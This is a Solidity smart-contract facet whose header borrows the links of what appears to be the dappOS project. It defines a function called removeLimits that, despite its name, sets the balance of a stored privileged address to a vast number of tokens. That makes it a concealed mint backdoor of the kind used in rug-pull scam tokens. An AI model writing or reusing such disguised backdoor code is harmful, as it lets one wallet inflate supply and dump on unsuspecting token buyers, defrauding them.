/*  
   * SPDX-License-Identifier: MIT 

    // Twitter: https://twitter.com/dappos_com
    // Website: https://dappos.com/
    // Telegram: https://t.me/DapposOfficial
    // Medium: https://medium.com/@dappos.com
    // Discord: https://discord.com/invite/sEtcYb9FgT
   

*/
pragma solidity ^0.8.23;

interface IPancakeFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
